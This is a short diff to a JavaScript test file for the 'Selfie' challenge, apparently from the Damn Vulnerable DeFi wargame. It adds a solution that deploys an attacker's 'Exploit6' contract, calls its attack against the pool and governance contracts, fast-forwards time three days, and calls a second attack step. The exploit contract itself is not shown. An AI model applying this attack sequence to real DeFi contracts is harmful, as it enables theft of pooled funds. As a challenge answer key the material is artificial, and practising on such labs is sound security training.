@@ -15,6 +15,9 @@ describe('[Challenge] Selfie', function () {
         const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
         const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);
 
+        const exploitFactory = await ethers.getContractFactory('Exploit6', attacker);
+        this.e6 = await exploitFactory.deploy();
+
         this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
         this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
         this.pool = await SelfiePoolFactory.deploy(
@@ -31,6 +34,9 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.e6.connect(attacker).attack(this.pool.address, this.governance.address, this.token.address);
+        await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]);
+        await this.e6.connect(attacker).attack2();
     });
 
     after(async function () {
